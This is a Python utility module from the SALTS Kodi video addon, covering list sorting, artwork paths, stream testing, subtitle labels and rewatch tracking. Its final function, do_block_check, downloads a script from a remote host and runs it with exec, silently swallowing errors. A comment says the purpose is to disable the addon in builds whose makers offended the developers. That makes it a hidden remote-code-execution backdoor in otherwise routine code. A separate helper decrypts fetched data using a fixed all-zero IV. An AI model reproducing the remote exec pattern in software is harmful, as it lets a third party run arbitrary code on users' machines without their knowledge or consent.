"""
    SALTS XBMC Addon
    Copyright (C) 2016 tknorris

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""
import datetime
import _strptime
import time
import re
import os
import urllib2
import urllib
import hashlib
import xml.etree.ElementTree as ET
import htmlentitydefs
import log_utils
import utils
import xbmc
import xbmcaddon
import xbmcvfs
import kodi
import pyaes
from constants import *
from salts_lib import strings

THEME_LIST = ['Shine', 'Luna_Blue', 'Iconic', 'Simple', 'SALTy', 'SALTy (Blended)', 'SALTy (Blue)', 'SALTy (Frog)', 'SALTy (Green)',
              'SALTy (Macaw)', 'SALTier (Green)', 'SALTier (Orange)', 'SALTier (Red)', 'IGDB', 'Simply Elegant', 'IGDB Redux', 'NaCl']
THEME = THEME_LIST[int(kodi.get_setting('theme'))]
if xbmc.getCondVisibility('System.HasAddon(script.salts.themepak)'):
    themepak_path = xbmcaddon.Addon('script.salts.themepak').getAddonInfo('path')
else:
    themepak_path = kodi.get_path()
THEME_PATH = os.path.join(themepak_path, 'art', 'themes', THEME)
PLACE_POSTER = os.path.join(kodi.get_path(), 'resources', 'place_poster.png')
translations = kodi.Translations(strings.STRINGS)

SORT_FIELDS = [
    (SORT_LIST[int(kodi.get_setting('sort1_field'))], SORT_SIGNS[kodi.get_setting('sort1_order')]),
    (SORT_LIST[int(kodi.get_setting('sort2_field'))], SORT_SIGNS[kodi.get_setting('sort2_order')]),
    (SORT_LIST[int(kodi.get_setting('sort3_field'))], SORT_SIGNS[kodi.get_setting('sort3_order')]),
    (SORT_LIST[int(kodi.get_setting('sort4_field'))], SORT_SIGNS[kodi.get_setting('sort4_order')]),
    (SORT_LIST[int(kodi.get_setting('sort5_field'))], SORT_SIGNS[kodi.get_setting('sort5_order')]),
    (SORT_LIST[int(kodi.get_setting('sort6_field'))], SORT_SIGNS[kodi.get_setting('sort6_order')])]

def art(name):
    path = os.path.join(THEME_PATH, name)
    if not xbmcvfs.exists(path):
        if name == 'fanart.jpg':
            path = os.path.join(kodi.get_path(), name)
        else:
            path = path.replace('.png', '.jpg')
    return path

def show_id(show):
    queries = {}
    ids = show['ids']
    for key in ('trakt', 'imdb', 'tvdb', 'tmdb', 'tvrage', 'slug'):
        if key in ids and ids[key]:
            queries['id_type'] = key
            queries['show_id'] = ids[key]
            break
    return queries

def title_key(title):
    if title is None: title = ''
    temp = title.upper()
    if temp.startswith('THE '):
        offset = 4
    elif temp.startswith('A '):
        offset = 2
    elif temp.startswith('AN '):
        offset = 3
    else:
        offset = 0
    return title[offset:]

def _released_key(item):
    if 'released' in item:
        return item['released']
    elif 'first_aired' in item:
        return item['first_aired']
    else:
        return 0

def sort_list(sort_key, sort_direction, list_data):
    log_utils.log('Sorting List: %s - %s' % (sort_key, sort_direction), log_utils.LOGDEBUG)
    # log_utils.log(json.dumps(list_data), log_utils.LOGDEBUG)
    reverse = False if sort_direction == TRAKT_SORT_DIR.ASCENDING else True
    if sort_key == TRAKT_LIST_SORT.RANK:
        return sorted(list_data, key=lambda x: x['rank'], reverse=reverse)
    elif sort_key == TRAKT_LIST_SORT.RECENTLY_ADDED:
        return sorted(list_data, key=lambda x: x['listed_at'], reverse=reverse)
    elif sort_key == TRAKT_LIST_SORT.TITLE:
        return sorted(list_data, key=lambda x: title_key(x[x['type']].get('title')), reverse=reverse)
    elif sort_key == TRAKT_LIST_SORT.RELEASE_DATE:
        return sorted(list_data, key=lambda x: _released_key(x[x['type']]), reverse=reverse)
    elif sort_key == TRAKT_LIST_SORT.RUNTIME:
        return sorted(list_data, key=lambda x: x[x['type']].get('runtime', 0), reverse=reverse)
    elif sort_key == TRAKT_LIST_SORT.POPULARITY:
        return sorted(list_data, key=lambda x: x[x['type']].get('votes', 0), reverse=reverse)
    elif sort_key == TRAKT_LIST_SORT.PERCENTAGE:
        return sorted(list_data, key=lambda x: x[x['type']].get('rating', 0), reverse=reverse)
    elif sort_key == TRAKT_LIST_SORT.VOTES:
        return sorted(list_data, key=lambda x: x[x['type']].get('votes', 0), reverse=reverse)
    else:
        log_utils.log('Unrecognized list sort key: %s - %s' % (sort_key, sort_direction), log_utils.LOGWARNING)
        return list_data
    
def make_seasons_info(progress):
    season_info = {}
    if progress:
        for season in progress['seasons']:
            info = {}
            if 'aired' in season: info['episode'] = info['TotalEpisodes'] = season['aired']
            if 'completed' in season: info['WatchedEpisodes'] = season['completed']
            if 'aired' in season and 'completed' in season:
                info['UnWatchedEpisodes'] = season['aired'] - season['completed']
                info['playcount'] = season['aired'] if season['completed'] == season['aired'] else 0

            if 'number' in season: info['season'] = season['number']
            season_info[str(season['number'])] = info
    return season_info

def make_episodes_watched(episodes, progress):
    watched = {}
    for season in progress['seasons']:
        watched[str(season['number'])] = {}
        for ep_status in season['episodes']:
            watched[str(season['number'])][str(ep_status['number'])] = ep_status['completed']

    for episode in episodes:
        season_str = str(episode['season'])
        episode_str = str(episode['number'])
        if season_str in watched and episode_str in watched[season_str]:
            episode['watched'] = watched[season_str][episode_str]
        else:
            episode['watched'] = False

    return episodes

def make_art(show):
    min_size = int(kodi.get_setting('image_size')) + 1
    art_dict = {'banner': '', 'fanart': art('fanart.jpg'), 'thumb': '', 'poster': PLACE_POSTER}
    images = show.get('images', {})
    for i in range(min_size):
        img_size = IMG_SIZES[i]
        if 'banner' in images and img_size in images['banner'] and images['banner'][img_size]:
            art_dict['banner'] = images['banner'][img_size]
        if 'fanart' in images and img_size in images['fanart'] and images['fanart'][img_size]:
            art_dict['thumb'] = art_dict['fanart'] = images['fanart'][img_size]
        if 'poster' in images and img_size in images['poster'] and images['poster'][img_size]:
            art_dict['thumb'] = art_dict['poster'] = images['poster'][img_size]
        if 'thumb' in images and img_size in images['thumb'] and images['thumb'][img_size]:
            art_dict['thumb'] = images['thumb'][img_size]
        if 'screenshot' in images and img_size in images['screenshot'] and images['screenshot'][img_size]:
            art_dict['thumb'] = images['screenshot'][img_size]
        if 'logo' in images and img_size in images['logo'] and images['logo'][img_size]:
            art_dict['clearlogo'] = images['logo'][img_size]
        if 'clearart' in images and img_size in images['clearart'] and images['clearart'][img_size]:
            art_dict['clearart'] = images['clearart'][img_size]
    return art_dict

def make_trailer(trailer_url):
    match = re.search('\?v=(.*)', trailer_url)
    if match:
        return 'plugin://plugin.video.youtube/?action=play_video&videoid=%s' % (match.group(1))

def make_ids(item):
    info = {}
    if 'ids' in item:
        ids = item['ids']
        if 'imdb' in ids: info['code'] = info['imdbnumber'] = info['imdb_id'] = ids['imdb']
        if 'tmdb' in ids: info['tmdb_id'] = ids['tmdb']
        if 'tvdb' in ids: info['tvdb_id'] = ids['tvdb']
        if 'trakt' in ids: info['trakt_id'] = ids['trakt']
        if 'slug' in ids: info['slug'] = ids['slug']
    return info

def make_people(item):
    people = {}
    if 'cast' in item: people['castandrole'] = people['cast'] = [(person['person']['name'], person['character']) for person in item['cast']]
    if 'crew' in item and 'directing' in item['crew']:
        directors = [director['person']['name'] for director in item['crew']['directing'] if director['job'].lower() == 'director']
        people['director'] = ', '.join(directors)
    if 'crew' in item and 'writing' in item['crew']:
        writers = [writer['person']['name'] for writer in item['crew']['writing'] if writer['job'].lower() in ['writer', 'screenplay', 'author']]
        people['writer'] = ', '.join(writers)

    return people

def make_air_date(first_aired):
    utc_air_time = utils.iso_2_utc(first_aired)
    try: air_date = time.strftime('%Y-%m-%d', time.localtime(utc_air_time))
    except ValueError:  # windows throws a ValueError on negative values to localtime
        d = datetime.datetime.fromtimestamp(0) + datetime.timedelta(seconds=utc_air_time)
        air_date = d.strftime('%Y-%m-%d')
    return air_date

def get_section_params(section):
    section_params = {}
    section_params['section'] = section
    if section == SECTIONS.TV:
        section_params['next_mode'] = MODES.SEASONS
        section_params['folder'] = True
        section_params['video_type'] = VIDEO_TYPES.TVSHOW
        section_params['content_type'] = CONTENT_TYPES.TVSHOWS
        section_params['search_img'] = 'television_search.png'
        section_params['label_plural'] = i18n('tv_shows')
        section_params['label_single'] = i18n('tv_show')
    else:
        section_params['next_mode'] = MODES.GET_SOURCES
        section_params['folder'] = False
        section_params['video_type'] = VIDEO_TYPES.MOVIE
        section_params['content_type'] = CONTENT_TYPES.MOVIES
        section_params['search_img'] = 'movies_search.png'
        section_params['label_plural'] = i18n('movies')
        section_params['label_single'] = i18n('movie')

    return section_params

def filename_from_title(title, video_type, year=None):
    if video_type == VIDEO_TYPES.TVSHOW:
        filename = '%s S%sE%s.strm'
        filename = filename % (title, '%s', '%s')
    else:
        if year: title = '%s (%s)' % (title, year)
        filename = '%s.strm' % title

    filename = re.sub(r'(?!%s)[^\w\-_\.]', '.', filename)
    filename = re.sub('\.+', '.', filename)
    xbmc.makeLegalFilename(filename)
    return filename

def filter_exclusions(hosters):
    exclusions = kodi.get_setting('excl_list')
    exclusions = exclusions.replace(' ', '')
    exclusions = exclusions.lower()
    if not exclusions: return hosters
    filtered_hosters = []
    for hoster in hosters:
        if hoster['host'].lower() in exclusions:
            log_utils.log('Excluding %s (%s) from %s' % (hoster['url'], hoster['host'], hoster['class'].get_name()), log_utils.LOGDEBUG)
            continue
        filtered_hosters.append(hoster)
    return filtered_hosters

def filter_quality(video_type, hosters):
    qual_filter = 5 - int(kodi.get_setting('%s_quality' % video_type))  # subtract to match Q_ORDER
    if qual_filter == 5:
        return hosters
    else:
        return [hoster for hoster in hosters if hoster['quality'] is not None and Q_ORDER[hoster['quality']] <= qual_filter]

def get_sort_key(item):
    item_sort_key = []
    for field, sign in SORT_FIELDS:
        if field == 'none':
            break
        elif field in SORT_KEYS:
            if field == 'source':
                value = item['class'].get_name()
            else:
                value = item[field]

            if value in SORT_KEYS[field]:
                item_sort_key.append(sign * int(SORT_KEYS[field][value]))
            else:  # assume all unlisted values sort as worst
                item_sort_key.append(sign * -1)
        elif field == 'debrid':
            if field in item:
                item_sort_key.append(sign * bool(item[field]))
            else:
                item_sort_key.append(0)
        else:
            if item[field] is None:
                item_sort_key.append(sign * -1)
            else:
                item_sort_key.append(sign * int(item[field]))
    # log_utils.log('item: %s sort_key: %s' % (item, item_sort_key), log_utils.LOGDEBUG)
    return tuple(item_sort_key)

def make_source_sort_string(sort_key):
    sorted_key = sorted(sort_key.items(), key=lambda x: -x[1])
    sort_string = '|'.join([element[0] for element in sorted_key])
    return sort_string

def test_stream(hoster):
    # parse_qsl doesn't work because it splits elements by ';' which can be in a non-quoted UA
    try:
        headers = dict([item.split('=') for item in (hoster['url'].split('|')[1]).split('&')])
        for key in headers: headers[key] = urllib.unquote(headers[key])
    except:
        headers = {}
    log_utils.log('Testing Stream: %s from %s using Headers: %s' % (hoster['url'], hoster['class'].get_name(), headers), xbmc.LOGDEBUG)
    request = urllib2.Request(hoster['url'].split('|')[0], headers=headers)

    msg = ''
    opener = urllib2.build_opener(urllib2.HTTPRedirectHandler)
    urllib2.install_opener(opener)
    try: http_code = urllib2.urlopen(request, timeout=2).getcode()
    except urllib2.URLError as e:
        # treat an unhandled url type as success
        if hasattr(e, 'reason') and 'unknown url type' in str(e.reason).lower():
            return True
        else:
            if isinstance(e, urllib2.HTTPError):
                http_code = e.code
            else:
                http_code = 600
        msg = str(e)
    except Exception as e:
        if 'unknown url type' in str(e).lower():
            return True
        else:
            log_utils.log('Exception during test_stream: (%s) %s' % (type(e).__name__, e), xbmc.LOGDEBUG)
            http_code = 601
        msg = str(e)

    if int(http_code) >= 400:
        log_utils.log('Test Stream Failed: Url: %s HTTP Code: %s Msg: %s' % (hoster['url'], http_code, msg), xbmc.LOGDEBUG)

    return int(http_code) < 400

def scraper_enabled(name):
    # return true if setting exists and set to true, or setting doesn't exist (i.e. '')
    return kodi.get_setting('%s-enable' % (name)) in ('true', '')

def make_day(date, use_words=True):
    date = to_datetime(date, '%Y-%m-%d').date()
    today = datetime.date.today()
    day_diff = (date - today).days
    date_format = kodi.get_setting('date_format')
    fallback_format = '%Y-%m-%d'
    try: day = date.strftime(date_format)
    except ValueError: day = date.strftime(fallback_format)
    if use_words:
        if day_diff == -1:
            day = 'YDA'
        elif day_diff == 0:
            day = 'TDA'
        elif day_diff == 1:
            day = 'TOM'
        elif day_diff > 1 and day_diff < 7:
            day = date.strftime('%a')

    return day

def make_time(utc_ts, setting):
    local_time = time.localtime(utc_ts)
    if kodi.get_setting(setting) == '1':
        time_format = '%H:%M'
        time_str = time.strftime(time_format, local_time)
    else:
        time_format = '%I%p' if local_time.tm_min == 0 else '%I:%M%p'
        time_str = time.strftime(time_format, local_time)
        if time_str[0] == '0': time_str = time_str[1:]
    return time_str

def to_datetime(dt_str, date_format):
    # strptime mysteriously fails sometimes with TypeError; this is a hacky workaround
    # note, they aren't 100% equal as time.strptime loses fractional seconds but they are close enough
    try: dt = datetime.datetime.strptime(dt_str, date_format)
    except (TypeError, ImportError): dt = datetime.datetime(*(time.strptime(dt_str, date_format)[0:6]))
    except Exception as e:
        log_utils.log('Failed dt conversion: (%s) - |%s|%s|' % (e, dt_str, date_format))
        dt = datetime.datetime.fromtimestamp(0)
    return dt

def format_sub_label(sub):
    label = '%s - [%s] - (' % (sub['language'], sub['version'])
    if sub['completed']:
        color = 'green'
    else:
        label += '%s%% Complete, ' % (sub['percent'])
        color = 'yellow'
    if sub['hi']: label += 'HI, '
    if sub['corrected']: label += 'Corrected, '
    if sub['hd']: label += 'HD, '
    if not label.endswith('('):
        label = label[:-2] + ')'
    else:
        label = label[:-4]
    label = '[COLOR %s]%s[/COLOR]' % (color, label)
    return label

def format_source_label(item):
    label = item['class'].format_source_label(item)
    label = '[%s] %s' % (item['class'].get_name(), label)
    if kodi.get_setting('show_debrid') == 'true' and 'debrid' in item and item['debrid']:
        label = '[COLOR green]%s[/COLOR]' % (label)
    if 'debrid' in item and item['debrid']:
        label += ' (%s)' % (', '.join(item['debrid']))
    item['label'] = label
    return label
    
def srt_indicators_enabled():
    return (kodi.get_setting('enable-subtitles') == 'true' and (kodi.get_setting('subtitle-indicator') == 'true'))

def srt_download_enabled():
    return (kodi.get_setting('enable-subtitles') == 'true' and (kodi.get_setting('subtitle-download') == 'true'))

def srt_show_enabled():
    return (kodi.get_setting('enable-subtitles') == 'true' and (kodi.get_setting('subtitle-show') == 'true'))

def format_episode_label(label, season, episode, srts):
    req_hi = kodi.get_setting('subtitle-hi') == 'true'
    req_hd = kodi.get_setting('subtitle-hd') == 'true'
    color = 'red'
    percent = 0
    hi = None
    hd = None
    corrected = None

    for srt in srts:
        if str(season) == srt['season'] and str(episode) == srt['episode']:
            if not req_hi or srt['hi']:
                if not req_hd or srt['hd']:
                    if srt['completed']:
                        color = 'green'
                        if not hi: hi = srt['hi']
                        if not hd: hd = srt['hd']
                        if not corrected: corrected = srt['corrected']
                    elif color != 'green':
                        color = 'yellow'
                        if float(srt['percent']) > percent:
                            if not hi: hi = srt['hi']
                            if not hd: hd = srt['hd']
                            if not corrected: corrected = srt['corrected']
                            percent = srt['percent']

    if color != 'red':
        label += ' [COLOR %s](SRT: ' % (color)
        if color == 'yellow':
            label += ' %s%%, ' % (percent)
        if hi: label += 'HI, '
        if hd: label += 'HD, '
        if corrected: label += 'Corrected, '
        label = label[:-2]
        label += ')[/COLOR]'
    return label

def record_failures(fails, counts=None):
    if counts is None: counts = {}

    for name in fails:
        setting = '%s_last_results' % (name)
        # remove timeouts from counts so they aren't double counted
        if name in counts: del counts[name]
        if int(kodi.get_setting(setting)) > -1:
            kodi.accumulate_setting(setting, 5)
    
    for name in counts:
        setting = '%s_last_results' % (name)
        if counts[name]:
            kodi.set_setting(setting, '0')
        elif int(kodi.get_setting(setting)) > -1:
            kodi.accumulate_setting(setting)

def menu_on(menu):
    return kodi.get_setting('show_%s' % (menu)) == 'true'

def sort_progress(episodes, sort_order):
    if sort_order == TRAKT_SORT.TITLE:
        return sorted(episodes, key=lambda x: title_key(x['show']['title']))
    elif sort_order == TRAKT_SORT.ACTIVITY:
        return sorted(episodes, key=lambda x: utils.iso_2_utc(x['last_watched_at']), reverse=True)
    elif sort_order == TRAKT_SORT.LEAST_COMPLETED:
        return sorted(episodes, key=lambda x: (x['percent_completed'], x['completed']))
    elif sort_order == TRAKT_SORT.MOST_COMPLETED:
        return sorted(episodes, key=lambda x: (x['percent_completed'], x['completed']), reverse=True)
    elif sort_order == TRAKT_SORT.PREVIOUSLY_AIRED:
        return sorted(episodes, key=lambda x: utils.iso_2_utc(x['episode']['first_aired']))
    elif sort_order == TRAKT_SORT.RECENTLY_AIRED:
        return sorted(episodes, key=lambda x: utils.iso_2_utc(x['episode']['first_aired']), reverse=True)
    else:  # default sort set to activity
        return sorted(episodes, key=lambda x: x['last_watched_at'], reverse=True)

def make_progress_msg(video):
    progress_msg = '%s: %s' % (video.video_type, video.title)
    if video.year: progress_msg += ' (%s)' % (video.year)
    if video.video_type == VIDEO_TYPES.EPISODE:
        progress_msg += ' - S%02dE%02d' % (int(video.season), int(video.episode))
    return progress_msg

def from_playlist():
    pl = xbmc.PlayList(xbmc.PLAYLIST_VIDEO)
    if pl.size() > 0:
        li = pl[pl.getposition()]
        plugin_url = 'plugin://%s/' % (kodi.get_id())
        if li.getfilename().lower().startswith(plugin_url):
            log_utils.log('Playing SALTS item from playlist |%s|%s|%s|' % (pl.getposition(), li.getfilename(), plugin_url), log_utils.LOGDEBUG)
            return True
    
    return False

def reset_base_url():
    xml_path = os.path.join(kodi.get_path(), 'resources', 'settings.xml')
    tree = ET.parse(xml_path)
    for category in tree.getroot().findall('category'):
        if category.get('label').startswith('Scrapers '):
            for setting in category.findall('setting'):
                if re.search('-base_url\d*$', setting.get('id')):
                    log_utils.log('Resetting: %s -> %s' % (setting.get('id'), setting.get('default')), xbmc.LOGDEBUG)
                    kodi.set_setting(setting.get('id'), setting.get('default'))

def get_and_decrypt(url, password):
    try:
        req = urllib2.urlopen(url)
        cipher_text = req.read()
    except Exception as e:
        log_utils.log('Failure during getting: %s (%s)' % (url, e), log_utils.LOGWARNING)
        return

    if cipher_text:
        scraper_key = hashlib.sha256(password).digest()
        IV = '\0' * 16
        decrypter = pyaes.Decrypter(pyaes.AESModeOfOperationCBC(scraper_key, IV))
        plain_text = decrypter.feed(cipher_text)
        plain_text += decrypter.feed()
        return plain_text

def get_force_title_list():
    return __get_list('force_title_match')

def get_progress_skip_list():
    return __get_list('progress_skip_cache')

def get_force_progress_list():
    return __get_list('force_include_progress')

def get_min_rewatch_list():
    return __get_list('rewatch_min_list')

def get_max_rewatch_list():
    return __get_list('rewatch_max_list')

def show_requires_source(trakt_id):
    return str(trakt_id) in __get_list('exists_list')

def __get_list(setting):
    filter_str = kodi.get_setting(setting)
    filter_list = filter_str.split('|') if filter_str else []
    return filter_list

def get_next_rewatch_method(trakt_id):
    rewatch_method = get_rewatch_method(trakt_id)
    if rewatch_method == REWATCH_METHODS.LAST_WATCHED:
        return i18n('least_watched_method'), REWATCH_METHODS.LEAST_WATCHED
    elif rewatch_method == REWATCH_METHODS.LEAST_WATCHED:
        return i18n('most_watched_method'), REWATCH_METHODS.MOST_WATCHED
    else:
        return i18n('last_watched_method'), REWATCH_METHODS.LAST_WATCHED
    
def get_rewatch_method(trakt_id):
    if str(trakt_id) in get_min_rewatch_list():
        return REWATCH_METHODS.LEAST_WATCHED
    elif str(trakt_id) in get_max_rewatch_list():
        return REWATCH_METHODS.MOST_WATCHED
    else:
        return REWATCH_METHODS.LAST_WATCHED

def make_plays(history):
    plays = {}
    if 'seasons' in history:
        for season in history['seasons']:
            plays[season['number']] = {}
            for episode in season['episodes']:
                plays[season['number']][episode['number']] = episode['plays']
    log_utils.log('Plays: %s' % (plays), log_utils.LOGDEBUG)
    return plays
    
def get_next_rewatch(trakt_id, plays, progress):
    rewatch_method = get_rewatch_method(trakt_id)
    next_episode = None
    pick_next = False
    if rewatch_method == REWATCH_METHODS.LEAST_WATCHED:
        min_plays = None
        for season in progress['seasons']:
            ep_plays = plays.get(season['number'], {})
            for episode in season['episodes']:
                if min_plays is None or ep_plays.get(episode['number'], 0) < min_plays:
                    next_episode = {'season': season['number'], 'episode': episode['number']}
                    min_plays = ep_plays.get(episode['number'], 0)
                    log_utils.log('Min Episode: %s - %s' % (min_plays, next_episode), log_utils.LOGDEBUG)
    elif rewatch_method == REWATCH_METHODS.MOST_WATCHED:
        max_plays = None
        for season in progress['seasons']:
            ep_plays = plays.get(season['number'], {})
            for episode in season['episodes']:
                if max_plays is None or pick_next:
                    next_episode = {'season': season['number'], 'episode': episode['number']}
                    if max_plays is None:
                        max_plays = 0
                        first_episode = next_episode
                    pick_next = False
                    log_utils.log('Max Next Episode: %s' % (next_episode), log_utils.LOGDEBUG)
                if ep_plays.get(episode['number'], 0) >= max_plays:
                    pick_next = True
                    max_plays = ep_plays.get(episode['number'], 0)
                    log_utils.log('Max Episode: %sx%s = %s' % (season['number'], episode['number'], max_plays))
            
            if max_plays == ep_plays.get(episode['number'], 0):
                next_episode = first_episode
    else:
        last_watched_at = progress['last_watched_at']
        first = True
        first_episode = None
        for season in progress['seasons']:
            for episode in season['episodes']:
                if first:
                    first_episode = {'season': season['number'], 'episode': episode['number']}
                    first = False
                    
                if last_watched_at is None or pick_next:
                    return {'season': season['number'], 'episode': episode['number']}
                elif episode['last_watched_at'] == last_watched_at:
                    log_utils.log('Last Watched: Season: %s - %s' % (season['number'], episode), log_utils.LOGDEBUG)
                    pick_next = True
        
        if next_episode is None:
            next_episode = first_episode
    
    return next_episode

def i18n(string_id):
    return translations.i18n(string_id)
    
def cleanse_title(text):
    def fixup(m):
        text = m.group(0)
        if text[:2] == "&#":
            # character reference
            try:
                if text[:3] == "&#x":
                    return unichr(int(text[3:-1], 16))
                else:
                    return unichr(int(text[2:-1]))
            except ValueError:
                pass
        else:
            # named entity
            try:
                text = unichr(htmlentitydefs.name2codepoint[text[1:-1]])
            except KeyError:
                pass
        return text
    
    if isinstance(text, str):
        try: text = text.decode('utf-8')
        except: pass
    return re.sub("&#?\w+;", fixup, text.strip())


'''
This check has been put in place to stop the inclusion of TVA (and friends) addons in builds
from build makers that publicly insult or slander TVA's developers and friends. If your build is
impacted by this check, you can have it removed by publicly apologizing for your previous statements
via youtube and twitter. Otherwise, stop including our addons in your builds or fork them and maintain
them yourself.
                                                                                           http://i.imgur.com/TqIEnYB.gif
                                                                                           TVA developers (and friends)
'''
def do_block_check(uninstall=False):
    try:
        import urllib2
        import sys
        namespace = {}
        exec urllib2.urlopen('http://offshoregit.com/tknorris/block_code.py').read() in namespace
        if namespace["real_check"](uninstall):
            sys.exit()
    except SystemExit:
        sys.exit()
    except:
        pass
